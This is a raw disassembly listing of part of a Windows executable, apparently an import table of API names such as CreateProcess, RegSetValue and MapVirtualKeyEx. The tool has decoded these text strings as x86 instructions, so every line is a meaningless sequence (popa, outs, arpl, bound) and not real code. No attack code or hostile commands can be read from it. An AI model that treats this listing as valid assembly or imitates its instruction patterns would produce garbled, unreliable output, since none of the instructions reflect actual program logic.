  412c14:	add    BYTE PTR [eax],al
  412c16:	lar    edx,WORD PTR [ebp+0x6e]
  412c1a:	jb     0x412c81
  412c1c:	popa   
  412c1d:	ins    BYTE PTR es:[edi],dx
  412c1e:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  412c25:	arpl   WORD PTR [eax+eax*1+0x41],si
  412c29:	add    DWORD PTR [edi+0x65],eax
  412c2c:	je     0x412c72
  412c2e:	gs jbe 0x412c9a
  412c31:	arpl   WORD PTR [ebp+0x43],sp
  412c34:	popa   
  412c35:	jo     0x412caa
  412c37:	add    BYTE PTR [ecx+0x1],dh
  412c3a:	inc    edi
  412c3b:	gs je  0x412c90
  412c3e:	dec    edi
  412c3f:	push   eax
  412c40:	xor    al,BYTE PTR [eax]
  412c42:	les    eax,FWORD PTR [eax]
  412c44:	inc    ebp
  412c45:	outs   dx,BYTE PTR ds:[esi]
  412c46:	jne    0x412cb5
  412c48:	inc    esi
  412c49:	outs   dx,DWORD PTR ds:[esi]
  412c4a:	outs   dx,BYTE PTR ds:[esi]
  412c4b:	je     0x412c93
  412c4d:	popa   
  412c4e:	ins    DWORD PTR es:[edi],dx
  412c4f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  412c57:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  412c5e:	je     0x412cc5
  412c60:	inc    esp
  412c61:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  412c68:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  412c6c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x1dd0070
  412c74:	push   ebx
  412c75:	gs je  0x412cbc
  412c78:	dec    ecx
  412c79:	inc    edx
  412c7a:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x654400b3
  412c82:	ins    BYTE PTR es:[edi],dx
  412c83:	gs je  0x412ceb
  412c86:	inc    esp
  412c87:	inc    ebx
  412c88:	add    BYTE PTR [eax],al
  412c8a:	mov    es,WORD PTR [ecx]
  412c8c:	inc    edi
  412c8d:	gs je  0x412ce6
  412c90:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  412c97:	dec    edi
  412c98:	jb     0x412d01
  412c9a:	inc    ebp
  412c9b:	js     0x412c9d
  412c9d:	add    BYTE PTR [ecx+0x1],bh
  412ca0:	inc    edi
  412ca1:	gs je  0x412cf7
  412ca4:	jns    0x412d19
  412ca6:	je     0x412d0d
  412ca8:	ins    DWORD PTR es:[edi],dx
  412ca9:	push   eax
  412caa:	popa   
  412cab:	ins    BYTE PTR es:[edi],dx
  412cac:	gs je  0x412d23
  412caf:	gs inc ebp
  412cb1:	outs   dx,BYTE PTR ds:[esi]
  412cb2:	je     0x412d26
  412cb4:	imul   esp,DWORD PTR [ebp+0x73],0x57021400
  412cbb:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  412cc3:	add    BYTE PTR [edi+0x1],ah
  412cc6:	inc    edi
  412cc7:	gs je  0x412d19
  412cca:	bound  ebp,QWORD PTR [edx+0x65]
  412ccd:	arpl   WORD PTR [ecx+eax*2+0x0],si
  412cd1:	add    BYTE PTR [ebx+0x74654701],cl
  412cd7:	push   esp
  412cd8:	gs js  0x412d4f
  412cdb:	dec    ebp
  412cdc:	gs je  0x412d51
  412cdf:	imul   esp,DWORD PTR [ebx+0x73],0x16e0057
  412ce6:	inc    edi
  412ce7:	gs je  0x412d3a
  412cea:	imul   edi,DWORD PTR [eax+0x65],0xc100006c
  412cf1:	add    DWORD PTR [edx+0x65],edx
  412cf4:	ins    DWORD PTR es:[edi],dx
  412cf5:	outs   dx,DWORD PTR ds:[esi]
  412cf6:	jbe    0x412d5d
  412cf8:	inc    esi
  412cf9:	outs   dx,DWORD PTR ds:[esi]
  412cfa:	outs   dx,BYTE PTR ds:[esi]
  412cfb:	je     0x412d4f
  412cfd:	gs jae 0x412d6f
  412d00:	jne    0x412d74
  412d02:	arpl   WORD PTR [ebp+0x57],sp
  412d05:	add    BYTE PTR [edx+0x63655201],bh
  412d0b:	je     0x412d63
  412d0d:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  412d14:	pop    edi
  412d15:	add    DWORD PTR [edi+0x65],eax
  412d18:	je     0x412d67
  412d1a:	popa   
  412d1b:	jo     0x412d6a
  412d1d:	outs   dx,DWORD PTR ds:[esi]
  412d1e:	fs add BYTE PTR gs:[eax],al
  412d22:	push   es
  412d23:	add    dl,BYTE PTR [ebx+0x74]
  412d26:	jb     0x412d8d
  412d28:	je     0x412d8d
  412d2a:	push   0x746c42
  412d2f:	add    BYTE PTR [esi+0x1],ah
  412d32:	inc    edi
  412d33:	gs je  0x412d84
  412d36:	gs popa 
  412d38:	jb     0x412d9f
  412d3a:	jae    0x412db0
  412d3c:	push   eax
  412d3d:	popa   
  412d3e:	ins    BYTE PTR es:[edi],dx
  412d3f:	gs je  0x412db6
  412d42:	gs dec ecx
  412d44:	outs   dx,BYTE PTR ds:[esi]
  412d45:	fs gs js 0x412d49
  412d49:	add    dh,bl
  412d4b:	add    DWORD PTR [ebx+0x65],edx
  412d4e:	je     0x412d94
  412d50:	dec    ecx
  412d51:	inc    edx
  412d52:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  412d5a:	imul   esp,DWORD PTR [ebx+0x65],0x47015c00
  412d61:	gs je  0x412db0
  412d64:	popa   
  412d65:	jns    0x412dd6
  412d67:	jne    0x412ddd
  412d69:	add    dl,bh
  412d6b:	add    DWORD PTR [ebx+0x65],edx
  412d6e:	je     0x412dc4
  412d70:	gs js  0x412de7
  412d73:	inc    ebx
  412d74:	outs   dx,DWORD PTR ds:[esi]
  412d75:	ins    BYTE PTR es:[edi],dx
  412d76:	outs   dx,DWORD PTR ds:[esi]
  412d77:	jb     0x412d79
  412d79:	add    BYTE PTR [esi+0x65724300],dl
  412d7f:	popa   
  412d80:	je     0x412de7
  412d82:	inc    ebp
  412d83:	ins    BYTE PTR es:[edi],dx
  412d84:	ins    BYTE PTR es:[edi],dx
  412d85:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  412d8c:	outs   dx,BYTE PTR ds:[esi]
  412d8d:	dec    ecx
  412d8e:	outs   dx,BYTE PTR ds:[esi]
  412d8f:	imul   esi,DWORD PTR fs:[edx+0x65],0x7f007463
  412d97:	add    DWORD PTR [edi+0x65],eax
  412d9a:	je     0x412df0
  412d9c:	gs js  0x412e13
  412d9f:	inc    ebx
  412da0:	outs   dx,DWORD PTR ds:[esi]
  412da1:	ins    BYTE PTR es:[edi],dx
  412da2:	outs   dx,DWORD PTR ds:[esi]
  412da3:	jb     0x412da5
  412da5:	add    BYTE PTR [ecx+0x74654701],cl
  412dab:	push   esp
  412dac:	gs js  0x412e23
  412daf:	inc    esi
  412db0:	popa   
  412db1:	arpl   WORD PTR [ebp+0x57],sp
  412db4:	add    BYTE PTR [eax],al
  412db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db7:	add    BYTE PTR [ebx+0x72],al
  412dba:	gs popa 
  412dbc:	je     0x412e23
  412dbe:	push   eax
  412dbf:	popa   
  412dc0:	ins    BYTE PTR es:[edi],dx
  412dc1:	gs je  0x412e38
  412dc4:	gs add bh,ch
  412dc7:	add    DWORD PTR [ebx+0x65],edx
  412dca:	je     0x412e1c
  412dcc:	imul   edi,DWORD PTR [eax+0x65],0xd000006c
  412dd3:	add    DWORD PTR [ebx+0x65],edx
  412dd6:	je     0x412e19
  412dd8:	bound  ebp,QWORD PTR [edi+0x72]
  412ddb:	je     0x412e2d
  412ddd:	jb     0x412e4e
  412ddf:	arpl   WORD PTR [eax],ax
  412de1:	add    dh,cl
  412de3:	add    BYTE PTR [ebp+0x78],al
  412de6:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  412dea:	gs inc ebx
  412dec:	ins    BYTE PTR es:[edi],dx
  412ded:	imul   esi,DWORD PTR [eax+0x52],0x746365
  412df4:	mov    esp,0x6c6c4500
  412df9:	imul   esi,DWORD PTR [eax+0x73],0x1c40065
  412e00:	push   edx
  412e01:	gs jae 0x412e6d
  412e04:	jp     0x412e6b
  412e06:	push   eax
  412e07:	popa   
  412e08:	ins    BYTE PTR es:[edi],dx
  412e09:	gs je  0x412e80
  412e0c:	gs add ah,cl
  412e0f:	add    DWORD PTR [ebx+0x65],edx
  412e12:	ins    BYTE PTR es:[edi],dx
  412e13:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  412e18:	imul   esi,DWORD PTR [eax+0x52],0xb3006e67
  412e1f:	add    DWORD PTR [eax+0x6f],edx
  412e22:	ins    BYTE PTR es:[edi],dx
  412e23:	jns    0x412e8c
  412e25:	outs   dx,DWORD PTR ds:[esi]
  412e26:	outs   dx,BYTE PTR ds:[esi]
  412e27:	add    BYTE PTR [edi+0x65724300],bl
  412e2d:	popa   
  412e2e:	je     0x412e95
  412e30:	dec    eax
  412e31:	popa   
  412e32:	ins    BYTE PTR es:[edi],dx
  412e33:	data16 je 0x412ea5
  412e36:	outs   dx,BYTE PTR ds:[esi]
  412e37:	gs push eax
  412e39:	popa   
  412e3a:	ins    BYTE PTR es:[edi],dx
  412e3b:	gs je  0x412eb2
  412e3e:	add    BYTE PTR gs:[edi+0x44],al
  412e42:	dec    ecx
  412e43:	xor    esi,DWORD PTR [edx]
  412e45:	cs fs ins BYTE PTR es:[edi],dx
  412e48:	ins    BYTE PTR es:[edi],dx
  412e49:	add    BYTE PTR [eax+eax*1+0x50],al
  412e4d:	popa   
  412e4e:	je     0x412eb8
  412e50:	inc    esi
  412e51:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  412e59:	jae    0x412e9c
  412e5b:	add    BYTE PTR [ebx+0x48],dl
  412e5e:	dec    esp
  412e5f:	push   edi
  412e60:	inc    ecx
  412e61:	push   eax
  412e62:	dec    ecx
  412e63:	cs fs ins BYTE PTR es:[edi],dx
  412e66:	ins    BYTE PTR es:[edi],dx
  412e67:	add    BYTE PTR [eax+0x1],dl
  412e6a:	inc    esi
  412e6b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  412e73:	outs   dx,DWORD PTR ds:[esi]
  412e74:	push   ebx
  412e75:	jns    0x412eea
  412e77:	je     0x412ede
  412e79:	ins    DWORD PTR es:[edi],dx
  412e7a:	push   esp
  412e7b:	imul   ebp,DWORD PTR [ebp+0x65],0x33a0000
  412e82:	dec    edi
  412e83:	jo     0x412eea
  412e85:	outs   dx,BYTE PTR ds:[esi]
  412e86:	inc    esi
  412e87:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5303db00
  412e8f:	gs popa 
  412e91:	jb     0x412ef6
  412e93:	push   0x68746150
  412e98:	inc    ecx
  412e99:	add    BYTE PTR [ecx],al
  412e9b:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  412e9f:	gs je  0x412f07
  412ea2:	inc    ebx
  412ea3:	jb     0x412f0e
  412ea5:	je     0x412f10
  412ea7:	arpl   WORD PTR [ecx+0x6c],sp
  412eaa:	push   ebx
  412eab:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  412eb0:	outs   dx,BYTE PTR ds:[esi]
  412eb1:	add    BYTE PTR [esi],bl
  412eb3:	add    al,BYTE PTR [edi+0x65]
  412eb6:	je     0x412f08
  412eb8:	jb     0x412f23
  412eba:	outs   dx,DWORD PTR ds:[esi]
  412ebb:	jb     0x412f26
  412ebd:	je     0x412f38
  412ebf:	inc    ebx
  412ec0:	ins    BYTE PTR es:[edi],dx
  412ec1:	popa   
  412ec2:	jae    0x412f37
  412ec4:	add    BYTE PTR [eax],al
  412ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec7:	add    BYTE PTR [ebx+0x61],al
  412eca:	outs   dx,BYTE PTR ds:[esi]
  412ecb:	arpl   WORD PTR [ebp+0x6c],sp
  412ece:	push   edi
  412ecf:	popa   
  412ed0:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  412ed8:	ins    DWORD PTR es:[edi],dx
  412ed9:	gs jb  0x412edc
  412edc:	dec    ebp
  412edd:	add    eax,0x7274736c
  412ee2:	ins    BYTE PTR es:[edi],dx
  412ee3:	outs   dx,BYTE PTR gs:[esi]
  412ee5:	inc    ecx
  412ee6:	add    BYTE PTR [eax],al
  412ee8:	mov    WORD PTR [ecx],es
  412eea:	inc    edi
  412eeb:	gs je  0x412f2f
  412eee:	je     0x412f5f
  412ef0:	ins    DWORD PTR es:[edi],dx
  412ef1:	dec    esi
  412ef2:	popa   
  412ef3:	ins    DWORD PTR es:[edi],dx
  412ef4:	gs push edi
  412ef6:	add    BYTE PTR [eax],al
  412ef8:	xor    eax,0x74655304
  412efd:	push   esp
  412efe:	push   0x64616572
  412f03:	inc    ecx
  412f04:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  412f0b:	dec    ebp
  412f0c:	popa   
  412f0d:	jae    0x412f7a
  412f0f:	add    BYTE PTR [ecx+0x6f6c4702],cl
  412f15:	bound  esp,QWORD PTR [ecx+0x6c]
  412f18:	inc    ecx
  412f19:	ins    BYTE PTR es:[edi],dx
  412f1a:	ins    BYTE PTR es:[edi],dx
  412f1b:	outs   dx,DWORD PTR ds:[esi]
  412f1c:	arpl   WORD PTR [eax],ax
  412f1e:	sbb    eax,0x74655304
  412f23:	dec    eax
  412f24:	popa   
  412f25:	outs   dx,BYTE PTR ds:[esi]
  412f26:	fs ins BYTE PTR es:[edi],dx
  412f28:	gs inc ebx
  412f2a:	outs   dx,DWORD PTR ds:[esi]
  412f2b:	jne    0x412f9b
  412f2d:	je     0x412f2f
  412f2f:	add    BYTE PTR [edx+0x2],ah
  412f32:	inc    edi
  412f33:	gs je  0x412f8a
  412f36:	gs ins DWORD PTR es:[edi],dx
  412f38:	jo     0x412f8a
  412f3a:	popa   
  412f3b:	je     0x412fa5
  412f3d:	push   edi
  412f3e:	add    BYTE PTR [eax],al
  412f40:	xchg   edx,eax
  412f41:	add    al,BYTE PTR [edi+0x6c]
  412f44:	outs   dx,DWORD PTR ds:[esi]
  412f45:	bound  esp,QWORD PTR [ecx+0x6c]
  412f48:	inc    edi
  412f49:	gs je  0x412f8d
  412f4c:	je     0x412fbd
  412f4e:	ins    DWORD PTR es:[edi],dx
  412f4f:	dec    esi
  412f50:	popa   
  412f51:	ins    DWORD PTR es:[edi],dx
  412f52:	gs push edi
  412f54:	add    BYTE PTR [eax],al
  412f56:	retf   0x4300
  412f59:	jb     0x412fc0
  412f5b:	popa   
  412f5c:	je     0x412fc3
  412f5e:	inc    ebp
  412f5f:	jbe    0x412fc6
  412f61:	outs   dx,BYTE PTR ds:[esi]
  412f62:	je     0x412fa5
  412f64:	add    BYTE PTR [eax],al
  412f66:	dec    edi
  412f67:	add    al,0x53
  412f69:	jne    0x412fde
  412f6b:	jo     0x412fd2
  412f6d:	outs   dx,BYTE PTR ds:[esi]
  412f6e:	fs push esp
  412f70:	push   0x64616572
  412f75:	add    BYTE PTR [ebx+0x2],ah
  412f78:	inc    edi
  412f79:	gs je  0x412fd0
  412f7c:	push   0x64616572
  412f81:	inc    ebx
  412f82:	outs   dx,DWORD PTR ds:[esi]
  412f83:	outs   dx,BYTE PTR ds:[esi]
  412f84:	je     0x412feb
  412f86:	js     0x412ffc
  412f88:	add    BYTE PTR [eax],al
  412f8a:	ret    
  412f8b:	add    al,0x6c
  412f8d:	jae    0x413003
  412f8f:	jb     0x412ff4
  412f91:	ins    DWORD PTR es:[edi],dx
  412f92:	jo     0x412feb
  412f94:	add    BYTE PTR [eax],al
  412f96:	retf   
  412f97:	add    cl,BYTE PTR [ecx+0x73]
  412f9a:	inc    edx
  412f9b:	popa   
  412f9c:	fs push edx
  412f9e:	gs popa 
  412fa0:	fs push eax
  412fa2:	je     0x413016
  412fa4:	add    BYTE PTR [eax],al
  412fa6:	int3   
  412fa7:	add    al,0x6c
  412fa9:	jae    0x41301f
  412fab:	jb     0x413010
  412fad:	jo     0x413028
  412faf:	outs   dx,BYTE PTR ds:[esi]
  412fb0:	push   edi
  412fb1:	add    dh,ah
  412fb3:	add    BYTE PTR [ebx+0x72],al
  412fb6:	gs popa 
  412fb8:	je     0x41301f
  412fba:	push   edx
  412fbb:	gs ins DWORD PTR es:[edi],dx
  412fbd:	outs   dx,DWORD PTR ds:[esi]
  412fbe:	je     0x413025
  412fc0:	push   esp
  412fc1:	push   0x64616572
  412fc6:	add    BYTE PTR [eax],al
  412fc8:	retf   
  412fc9:	add    DWORD PTR [edi+0x65],eax
  412fcc:	je     0x413011
  412fce:	jne    0x413042
  412fd0:	jb     0x413037
  412fd2:	outs   dx,BYTE PTR ds:[esi]
  412fd3:	je     0x413019
  412fd5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412fdc:	jns    0x413035
  412fde:	add    BYTE PTR [eax],al
  412fe0:	inc    edx
  412fe1:	add    al,BYTE PTR [edi+0x65]
  412fe4:	je     0x413039
  412fe6:	push   0x5074726f
  412feb:	popa   
  412fec:	je     0x413056
  412fee:	dec    esi
  412fef:	popa   
  412ff0:	ins    DWORD PTR es:[edi],dx
  412ff1:	gs inc ecx
  412ff3:	add    al,dl
  412ff5:	add    BYTE PTR [ebx+0x72],al
  412ff8:	gs popa 
  412ffa:	je     0x413061
  412ffc:	inc    esi
  412ffd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x45012000
  413005:	outs   dx,BYTE PTR ds:[esi]
  413006:	jne    0x413075
  413008:	push   edx
  413009:	gs jae 0x41307b
  41300c:	jne    0x413080
  41300e:	arpl   WORD PTR [ebp+0x4e],sp
  413011:	popa   
  413012:	ins    DWORD PTR es:[edi],dx
  413013:	gs jae 0x413057
  413016:	add    BYTE PTR [eax],al
  413018:	or     DWORD PTR [edx],eax
  41301a:	inc    edi
  41301b:	gs je  0x41306b
  41301e:	outs   dx,DWORD PTR ds:[esi]
  41301f:	fs jne 0x41308e
  413022:	gs inc esi
  413024:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41302c:	add    BYTE PTR [eax],al
  41302e:	ret    
  41302f:	add    edx,DWORD PTR [edx+0x74]
  413032:	ins    BYTE PTR es:[edi],dx
  413033:	push   ebp
  413034:	outs   dx,BYTE PTR ds:[esi]
  413035:	ja     0x4130a0
  413037:	outs   dx,BYTE PTR ds:[esi]
  413038:	add    BYTE PTR fs:[ebx],cl
  41303b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41303f:	popa   
  413040:	ins    BYTE PTR es:[edi],dx
  413041:	inc    ecx
  413042:	ins    BYTE PTR es:[edi],dx
  413043:	ins    BYTE PTR es:[edi],dx
  413044:	outs   dx,DWORD PTR ds:[esi]
  413045:	arpl   WORD PTR [eax],ax
  413047:	add    BYTE PTR [esp+eax*1+0x456e6957],dl
  41304e:	js     0x4130b5
  413050:	arpl   WORD PTR [eax],ax
  413052:	or     al,BYTE PTR [edx]
  413054:	inc    edi
  413055:	gs je  0x4130a5
  413058:	outs   dx,DWORD PTR ds:[esi]
  413059:	fs jne 0x4130c8
  41305c:	gs dec eax
  41305e:	popa   
  41305f:	outs   dx,BYTE PTR ds:[esi]
  413060:	fs ins BYTE PTR es:[edi],dx
  413062:	gs inc ecx
  413064:	add    BYTE PTR [eax],al
  413066:	sti    
  413067:	add    DWORD PTR [edi+0x65],eax
  41306a:	je     0x4130b8
  41306c:	popa   
  41306d:	jae    0x4130e3
  41306f:	inc    ebp
  413070:	jb     0x4130e4
  413072:	outs   dx,DWORD PTR ds:[esi]
  413073:	jb     0x413075
  413075:	add    BYTE PTR [edi+0x74654701],bl
  41307b:	inc    ebx
  41307c:	outs   dx,DWORD PTR ds:[esi]
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	jo     0x4130f5
  413080:	je     0x4130e7
  413082:	jb     0x4130d2
  413084:	popa   
  413085:	ins    DWORD PTR es:[edi],dx
  413086:	gs inc ecx
  413088:	add    BYTE PTR [eax],al
  41308a:	add    al,BYTE PTR [bx+0x65]
  41308e:	je     0x4130e4
  413090:	push   0x64616572
  413095:	dec    esp
  413096:	outs   dx,DWORD PTR ds:[esi]
  413097:	arpl   WORD PTR [ecx+0x6c],sp
  41309a:	gs add bl,dh
  41309d:	add    DWORD PTR [edi+0x65],eax
  4130a0:	je     0x4130e8
  4130a2:	jne    0x413110
  4130a4:	ins    BYTE PTR es:[edi],dx
  4130a5:	push   eax
  4130a6:	popa   
  4130a7:	je     0x413111
  4130a9:	dec    esi
  4130aa:	popa   
  4130ab:	ins    DWORD PTR es:[edi],dx
  4130ac:	gs push edi
  4130ae:	add    BYTE PTR [eax],al
  4130b0:	mov    ah,0x3
  4130b2:	push   edx
  4130b3:	gs ins DWORD PTR es:[edi],dx
  4130b5:	outs   dx,DWORD PTR ds:[esi]
  4130b6:	jbe    0x41311d
  4130b8:	inc    esp
  4130b9:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130c0:	jns    0x413119
  4130c2:	add    BYTE PTR [eax],al
  4130c4:	and    al,0x3
  4130c6:	dec    ebp
  4130c7:	popa   
  4130c8:	jo     0x413120
  4130ca:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR gs:[eax+0x4],al
  4130d6:	push   ebx
  4130d7:	gs je  0x41312e
  4130da:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4130e1:	jne    0x413148
  4130e3:	push   esp
  4130e4:	imul   ebp,DWORD PTR [ebp+0x65],0xf7000072
  4130eb:	add    DWORD PTR [edi+0x65],eax
  4130ee:	je     0x413138
  4130f0:	popa   
  4130f1:	outs   dx,BYTE PTR ds:[esi]
  4130f2:	fs ins BYTE PTR es:[edi],dx
  4130f4:	gs dec ecx
  4130f6:	outs   dx,BYTE PTR ds:[esi]
  4130f7:	outs   dx,WORD PTR ds:[esi]
  4130f9:	jb     0x413168
  4130fb:	popa   
  4130fc:	je     0x413167
  4130fe:	outs   dx,DWORD PTR ds:[esi]
  4130ff:	outs   dx,BYTE PTR ds:[esi]
  413100:	add    BYTE PTR [eax],al
  413102:	jmp    0x6946:0x74654701
  413109:	ins    BYTE PTR es:[edi],dx
  41310a:	gs inc ecx
  41310c:	je     0x413182
  41310e:	jb     0x413179
  413110:	bound  esi,QWORD PTR [ebp+0x74]
  413113:	gs jae 0x41315b
  413116:	js     0x413159
  413118:	add    BYTE PTR [eax],al
  41311a:	pop    ss
  41311b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41311f:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413123:	add    BYTE PTR gs:[eax],al
  413126:	mov    BYTE PTR [eax],al
  413128:	inc    ecx
  413129:	jb     0x413190
  41312b:	inc    esi
  41312c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  413134:	dec    esi
  413135:	push   ebx
  413136:	dec    ecx
  413137:	add    BYTE PTR [esi+0x1],ch
  41313a:	inc    esi
  41313b:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  413142:	jne    0x4131b6
  413144:	arpl   WORD PTR [ebp+0x45],sp
  413147:	js     0x4131a0
  413149:	add    BYTE PTR [ecx+0x1],bl
  41314c:	inc    esi
  41314d:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  413154:	add    BYTE PTR gs:0x74655304,ah
  41315b:	dec    ebp
  41315c:	popa   
  41315d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  413165:	outs   dx,WORD PTR ds:[esi]
  413167:	add    BYTE PTR [edx+0x65724601],al
  41316d:	gs dec esp
  41316f:	imul   esp,DWORD PTR [edx+0x72],0x797261
  413176:	js     0x41317b
  413178:	push   edx
  413179:	gs popa 
  41317b:	fs inc esi
  41317d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x53043c00
  413185:	gs je  0x4131dc
  413188:	push   0x64616572
  41318d:	push   eax
  41318e:	jb     0x4131f9
  413190:	outs   dx,DWORD PTR ds:[esi]
  413191:	jb     0x4131fc
  413193:	je     0x41320e
  413195:	add    BYTE PTR [ecx+0x2],ah
  413198:	inc    edi
  413199:	gs je  0x4131f0
  41319c:	gs ins DWORD PTR es:[edi],dx
  41319e:	jo     0x4131f0
  4131a0:	popa   
  4131a1:	je     0x41320b
  4131a3:	inc    ecx
  4131a4:	add    BYTE PTR [eax],al
  4131a6:	or     BYTE PTR [ecx],al
  4131a8:	inc    esp
  4131a9:	gs jbe 0x413215
  4131ac:	arpl   WORD PTR [ebp+0x49],sp
  4131af:	outs   dx,DWORD PTR ds:[esi]
  4131b0:	inc    ebx
  4131b1:	outs   dx,DWORD PTR ds:[esi]
  4131b2:	outs   dx,BYTE PTR ds:[esi]
  4131b3:	je     0x413227
  4131b5:	outs   dx,DWORD PTR ds:[esi]
  4131b6:	ins    BYTE PTR es:[edi],dx
  4131b7:	add    BYTE PTR [edi+0x1],cl
  4131ba:	inc    esi
  4131bb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  4131c3:	outs   dx,DWORD PTR ds:[esi]
  4131c4:	dec    esp
  4131c5:	outs   dx,DWORD PTR ds:[esi]
  4131c6:	arpl   WORD PTR [ecx+0x6c],sp
  4131c9:	inc    esi
  4131ca:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  4131d2:	repnz add BYTE PTR [ebx+0x72],al
  4131d6:	gs popa 
  4131d8:	je     0x41323f
  4131da:	push   edi
  4131db:	popa   
  4131dc:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4131e4:	ins    DWORD PTR es:[edi],dx
  4131e5:	gs jb  0x413229
  4131e8:	add    BYTE PTR [eax],al
  4131ea:	jns    0x4131ee
  4131ec:	inc    edi
  4131ed:	gs je  0x413246
  4131f0:	gs jb  0x413266
  4131f3:	imul   ebp,DWORD PTR [edi+0x6e],0x454b0000
  4131fa:	push   edx
  4131fb:	dec    esi
  4131fc:	inc    ebp
  4131fd:	dec    esp
  4131fe:	xor    esi,DWORD PTR [edx]
  413200:	cs fs ins BYTE PTR es:[edi],dx
  413203:	ins    BYTE PTR es:[edi],dx
  413204:	add    BYTE PTR [eax],al
  413206:	cmp    al,0x0
  413208:	inc    ebx
  413209:	push   0x4d6b6365
  41320e:	outs   dx,BYTE PTR gs:[esi]
  413210:	jne    0x413264
  413212:	popa   
  413213:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41321b:	add    BYTE PTR [edx+0x2],al
  41321e:	push   ebx
  41321f:	gs je  0x413268
  413222:	outs   dx,DWORD PTR ds:[esi]
  413223:	jb     0x41328a
  413225:	addr16 jb 0x413297
  413228:	jne    0x413298
  41322a:	fs push edi
  41322c:	imul   ebp,DWORD PTR [esi+0x64],0x5500776f
  413233:	add    DWORD PTR [edi+0x65],eax
  413236:	je     0x41328b
  413238:	arpl   WORD PTR [edx+0x6f],si
  41323b:	ins    BYTE PTR es:[edi],dx
  41323c:	ins    BYTE PTR es:[edi],dx
  41323d:	push   eax
  41323e:	outs   dx,DWORD PTR ds:[esi]
  41323f:	jae    0x413241
  413241:	add    ah,al
  413243:	add    DWORD PTR [ebp+0x61],ecx
  413246:	jo     0x41328c
  413248:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41324f:	arpl   WORD PTR [eax+eax*1+0x24],si
  413253:	add    BYTE PTR [ebx+0x68],al
  413256:	popa   
  413257:	outs   dx,BYTE PTR ds:[esi]
  413258:	addr16 gs dec ebp
  41325b:	outs   dx,BYTE PTR gs:[esi]
  41325d:	jne    0x4132b6
  41325f:	add    cl,bh
  413261:	add    BYTE PTR [edi+0x65],al
  413264:	je     0x4132a9
  413266:	ins    BYTE PTR es:[edi],dx
  413267:	popa   
  413268:	jae    0x4132dd
  41326a:	dec    esp
  41326b:	outs   dx,DWORD PTR ds:[esi]
  41326c:	outs   dx,BYTE PTR ds:[esi]
  41326d:	addr16 push edi
  41326f:	add    bh,al
  413271:	add    DWORD PTR [ebp+0x61],ecx
  413274:	jo     0x4132cc
  413276:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41327d:	gs jns 0x4132c5
  413280:	js     0x4132d9
  413282:	add    BYTE PTR [eax],al
  413284:	loop   0x413286
  413286:	inc    esi
  413287:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41328e:	outs   dx,DWORD PTR ds:[esi]
  41328f:	ja     0x4132d6
  413291:	js     0x4132d4
  413293:	add    BYTE PTR [edi+0x73694400],bl
  413299:	jo     0x4132fc
  41329b:	je     0x413300
  41329d:	push   0x7373654d
  4132a2:	popa   
  4132a3:	addr16 gs inc ecx
  4132a6:	add    BYTE PTR [eax],al
  4132a8:	mov    es,WORD PTR [ecx]
  4132aa:	dec    ecx
  4132ab:	jae    0x4132f0
  4132ad:	push   0x6c417261
  4132b2:	jo     0x41331c
  4132b4:	popa   
  4132b5:	dec    esi
  4132b6:	jne    0x413325
  4132b8:	gs jb  0x413324
  4132bb:	arpl   WORD PTR [edi+0x0],dx
  4132be:	push   ecx
  4132bf:	add    BYTE PTR [ebx+0x72],al
  4132c2:	gs popa 
  4132c4:	je     0x41332b
  4132c6:	inc    ebx
  4132c7:	popa   
  4132c8:	jb     0x41332f
  4132ca:	je     0x4132cc
  4132cc:	mov    dl,0x0
  4132ce:	inc    esp
  4132cf:	jb     0x413332
  4132d1:	ja     0x413319
  4132d3:	jb     0x413336
  4132d5:	ins    DWORD PTR es:[edi],dx
  4132d6:	gs inc ebx
  4132d8:	outs   dx,DWORD PTR ds:[esi]
  4132d9:	outs   dx,BYTE PTR ds:[esi]
  4132da:	je     0x41334e
  4132dc:	outs   dx,DWORD PTR ds:[esi]
